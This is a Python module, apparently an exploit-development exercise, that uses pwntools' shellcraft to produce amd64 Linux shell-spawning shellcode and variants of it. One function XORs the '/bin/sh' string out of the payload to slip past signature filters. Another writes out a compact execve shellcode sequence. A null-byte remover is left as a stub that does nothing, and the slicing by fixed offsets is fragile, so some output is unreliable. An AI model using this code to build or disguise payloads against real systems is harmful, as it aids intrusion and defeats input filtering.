from pwnlib import shellcraft

newline = "\n"

################################################################
# This just returns the original shellcraft shellcode
################################################################
def sh():
    return shellcraft.amd64.linux.sh()

################################################################
# This extracts the /bin/sh string, xor's it with an arbitrary
# value. This value which doesn't contain /bin/sh is used to
# construct new equivalent instruction to replace the instruction
# that contained the /bin/sh string in the first place
################################################################
def nobinsh():

    mixer = "0x0202020202020202"
    space = "    "

    raw = shellcraft.amd64.linux.sh()
    #print("length of shell: ", len(raw))
    comment_line = raw[:-219]
    binsh_line = raw[50:-173]
    #print("binsh line 2: ",binsh_line)
    binsh = binsh_line[9:]
    binsh2 = binsh[56:75]
    #print("TEST: ", test)
    #print("length of binsh", len(binsh))
    #print("binsh line: ",binsh)
    #binsh = str(hex((int(binsh, 16) ^  int(mixer,16))))
    binsh = str(hex((int(binsh2, 16) ^  int(mixer,16))))

    mangled_binsh = newline + space + "mov rax, " + binsh + newline
    mangled_binsh += space + "mov r9, " + mixer + newline
    mangled_binsh += space + "xor rax, r9"

    # print("mangled_binsh: \n", mangled_binsh)
    # print("TEST: \n",raw[0:101])
    # print("TEST2: \n", raw[133:] )
    # print("TEST3: \n", raw[0:101] + mangled_binsh + raw[133:])
    # raw = raw.replace(binsh_line, mangled_binsh)
    raw = raw[0:101] + mangled_binsh + raw[133:]
    # print("new raw value: ", raw)
    return raw

################################################################
# TODO: This removes all null values in the shell code. This is a
# tough problem and more time is needed for a strategy. Usually
# instruction swith constant operands are the source of nulls,
# figuring out how to replace these instructions is non-trivial.
################################################################
def nonull(src):
    index = 0
    instr = " "
    operand = " "
    hasmov = False
    haspush = False
    hasrsp = False
    haspop = False

    lines = src.splitlines()
    #print(lines)

    for line in lines:
        tokens = line.split()
        for word in tokens:
            if ("0x" in word ) or  word.isnumeric() or ("rsp" in word) or ("pop" in word):
                if "mov" in line:
                    #print("move instruction")
                    #print(line)
                    hasmov = True
                if "push" in line:
                    #print("push instruction")
                    #print(line)
                    haspush = True
                if "rsp" in line:
                    #print("rsp as operand instruction")
                    #print(line)
                    hasrsp = True
                if "pop" in line:
                    #print("pop instruction")
                    #print(line)
                    haspop = True

    dest = src
    return dest

################################################################
# TODO: This attempts to shrink the shellcode to at most length
# len bytes.
################################################################
def compact():
    space = "    "
    raw = shellcraft.amd64.linux.sh()
    print("TEST4: \n", raw[102:146])
    original_code = raw[102:146]
    shorten_code = newline + space + "xor esi, esi" + newline
    shorten_code += space + "push rsi" + newline
    shorten_code += original_code + newline
    shorten_code += space + "push rsp" + newline
    shorten_code += space + "pop rdi" + newline
    shorten_code += space + "imul esi" + newline
    shorten_code += space + "mov al, 0x3b" + newline
    shorten_code += space + "syscall" + newline
    #return shellcraft.amd64.linux.sh()
    return shorten_code
